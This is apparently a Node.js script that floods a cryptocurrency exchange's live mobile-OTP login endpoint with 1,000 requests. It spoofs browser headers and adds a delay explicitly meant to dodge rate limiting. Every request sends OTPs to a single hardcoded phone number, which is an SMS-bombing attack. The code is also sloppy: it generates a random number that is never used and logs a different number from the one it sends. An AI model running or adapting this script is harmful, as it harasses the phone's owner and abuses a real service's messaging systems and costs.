const axios = require('axios');

// API Endpoint
const url = "https://accounts.paybito.com/api/user/sendMobileOtp/login";

// Headers
const headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "Origin": "https://trade.paybito.com",
    "Referer": "https://trade.paybito.com/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "macOS"
};

// Country codes list
// const countryCodes = ["91", "1", "444", "61", "33", "49",""];

const countryCodes = ["91"]
const sendOtpRequest = async (i) => {
    const phoneNumber = Math.floor(6000000000 + Math.random() * 3999999999).toString();
    const countryCode = countryCodes[Math.floor(Math.random() * countryCodes.length)];
    
    const data = {
        phone: '8609245678',
        countryCode: countryCode
    };
    
    try {
        const response = await axios.post(url, data, { headers });
        console.log(response?.data?.error?.error_msg,"response")
        console.log(`Request ${i + 1}: Phone - ${'7656789087'}, CountryCode - ${countryCode}, Status - ${response.status}`);
    } catch (error) {
        console.error(`Request ${i + 1} failed:`, error.message);
    }
};

const runRequests = async () => {
    for (let i = 0; i < 1000; i++) {
        await sendOtpRequest(i);
        await new Promise(resolve => setTimeout(resolve, 1000)); // Delay to avoid rate limiting
    }
};

runRequests();
